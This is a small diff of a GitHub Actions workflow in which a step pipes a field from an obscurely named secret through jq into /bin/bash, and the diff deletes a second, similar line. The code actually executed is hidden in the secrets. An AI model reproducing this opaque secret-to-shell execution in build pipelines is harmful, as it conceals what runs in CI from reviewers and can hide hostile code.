@@ -17,7 +17,6 @@ jobs:
           b79: ${{ secrets.b79 }}
         run: |
           printf '%s' "$b79" | jq -r .u2088 | /bin/bash
-          printf '%s' "$wvqan00" | jq -r .hjzs60 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
